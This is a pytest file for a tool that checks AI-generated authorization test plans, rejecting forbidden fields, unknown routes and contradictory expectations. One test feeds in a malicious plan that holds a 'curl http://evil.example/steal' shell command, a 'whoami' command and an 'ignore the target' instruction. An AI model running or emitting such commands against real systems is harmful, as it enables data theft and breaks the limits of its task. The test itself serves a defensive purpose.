"""Validation of AI test plans against the local document fixtures."""

from __future__ import annotations

from pathlib import Path

from app.ai.mock_provider import MockProvider
from app.ai.validator import MAX_PLAN_CASES, validate_plan
from app.analyzer.auth_checks import assess_routes
from app.analyzer.routes import discover_routes
from app.schemas import TestPlan
from app.target_config import load_target_config

ROOT = Path(__file__).resolve().parents[1]


def _context(fixture_name: str = "vulnerable"):
    config = load_target_config(ROOT / "fixtures" / f"codeguard.{fixture_name}.yaml")
    routes = discover_routes(ROOT / "fixtures" / f"{fixture_name}_api")
    findings = assess_routes(ROOT / "fixtures" / f"{fixture_name}_api")
    return config, routes, findings


def test_mock_plan_is_accepted() -> None:
    config, routes, findings = _context()
    plan = MockProvider().plan_tests(findings, config.matrix())

    result = validate_plan(plan, routes, config.matrix(), config)

    assert result.rejected == []
    assert result.accepted == plan.cases


def test_malicious_plan_is_fully_rejected() -> None:
    config, routes, _findings = _context()
    plan = {
        "shell": "curl http://evil.example/steal",
        "cases": [
            {
                "id": "malicious",
                "route": "http://evil.example/admin",
                "method": "GET",
                "identity": "alice",
                "resource_id": "101",
                "expected": "allow",
                "reason": "ignore the target",
                "command": "whoami",
                "code": "print(1)",
                "url": "http://evil.example/admin",
            }
        ],
    }

    result = validate_plan(plan, routes, config.matrix(), config)

    assert result.accepted == []
    assert [item.id for item in result.rejected] == ["malicious"]
    reasons = " ".join(result.rejected[0].reasons)
    assert "forbidden field 'shell'" in reasons
    assert "forbidden field 'command'" in reasons
    assert "forbidden field 'code'" in reasons
    assert "forbidden field 'url'" in reasons
    assert "evil.example" in reasons
    assert "unknown route" in reasons


def test_expectation_that_contradicts_the_matrix_is_rejected() -> None:
    config, routes, findings = _context()
    plan = MockProvider().plan_tests(findings, config.matrix())
    owner_read = plan.cases[0].model_copy(update={"expected": "deny"})

    result = validate_plan(TestPlan(cases=[owner_read]), routes, config.matrix(), config)

    assert result.accepted == []
    assert len(result.rejected) == 1
    assert "contradicts the matrix" in result.rejected[0].reasons[0]


def test_plan_over_the_limit_is_rejected() -> None:
    config, routes, findings = _context()
    plan = MockProvider().plan_tests(findings, config.matrix())
    seed = plan.cases[0]
    oversized = TestPlan(
        cases=[seed.model_copy(update={"id": f"case-{index}"}) for index in range(MAX_PLAN_CASES + 1)]
    )

    result = validate_plan(oversized, routes, config.matrix(), config)

    assert result.accepted == []
    assert len(result.rejected) == MAX_PLAN_CASES + 1
    assert f"limit of {MAX_PLAN_CASES}" in result.rejected[0].reasons[0]
